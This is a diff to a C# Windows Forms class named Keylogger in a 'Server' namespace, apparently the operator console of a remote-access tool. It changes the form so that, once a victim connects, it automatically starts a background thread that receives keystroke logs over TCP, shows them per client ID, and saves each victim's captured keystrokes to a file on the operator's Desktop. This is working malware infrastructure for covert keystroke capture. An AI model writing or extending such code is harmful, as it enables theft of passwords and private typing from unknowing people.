@@ -1,14 +1,7 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net.Sockets;
-using System.Net;
 using System.Threading;
 using System.IO;
 
@@ -19,57 +12,59 @@ namespace Server
         NetworkStream KeylogStream;
         private Thread KeyLogger;
         private TcpClient clientLog;
-        public Keylogger(TcpClient client)
+        public Keylogger(TcpClient client, string ID)
         {
-            clientLog = client;
-            CheckForIllegalCrossThreadCalls = false;
             InitializeComponent();
-
+            clientLog = client;
+            this.Name += '_' + ID;
+            this.Text += '_' + ID;
+            CheckForIllegalCrossThreadCalls = false;
+            KeyLogger = new Thread(logFunction);
+            KeyLogger.IsBackground = true;
+            KeyLogger.Start();
         }
-
         public void logFunction()
         {
-            btn_KeyLogging.Enabled = false;
+            KeylogStream = clientLog.GetStream();
+            KeylogStream.Flush();
             while (clientLog.Connected)
             {
                 try
                 {
-                    KeylogStream = clientLog.GetStream();
                     byte[] data = new byte[1024];
                     int numBytesRead = KeylogStream.Read(data, 0, data.Length);
                     if (numBytesRead > 0)
                     {
-                        string GetLog = Encoding.ASCII.GetString(data, 0, numBytesRead);
+                        string GetLog = Encoding.UTF8.GetString(data, 0, numBytesRead);
                         richTextBox1.Text += GetLog;
                     }
-                    btn_KeyLogging.Enabled = true;
+
                 }
-                catch (Exception)
+                catch (Exception ex)
                 {
-                    btn_KeyLogging.Enabled = true;
+                    MessageBox.Show(ex.Message);
+
                 }
             }
         }
-        private void btn_KeyLogging_Click(object sender, EventArgs e)
-        {
-            KeyLogger = new Thread(logFunction);
-            KeyLogger.IsBackground = true;
-            KeyLogger.Start();
-            btn_KeyLogging.Text = "Key logging in process";
-        }
-
         private void btn_XuatFile_Click(object sender, EventArgs e)
         {
-            string content = richTextBox1.Text;
-            SaveFileDialog save = new SaveFileDialog();
-            save.Filter = "txt files (*.txt)|*.txt";
-            save.FileName = "Logger.txt";
-            save.ShowDialog();
-            FileStream fs = new FileStream(save.FileName, FileMode.Create);
-            StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
-            sr.Write(content);
-            sr.Close();
-            fs.Close();
+            try
+            {
+                string content = richTextBox1.Text;
+                string clientname = this.Name.Replace(':', '_');
+                string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\[Key_Log_" + clientname + "]" + ".txt";
+                FileStream fs = new FileStream(filePath, FileMode.Create);
+                StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
+                sr.Write(content);
+                sr.Close();
+                fs.Close();
+            }
+            catch (Exception exc)
+            {
+                MessageBox.Show(exc.Message);
+            }
+
         }
     }
 }
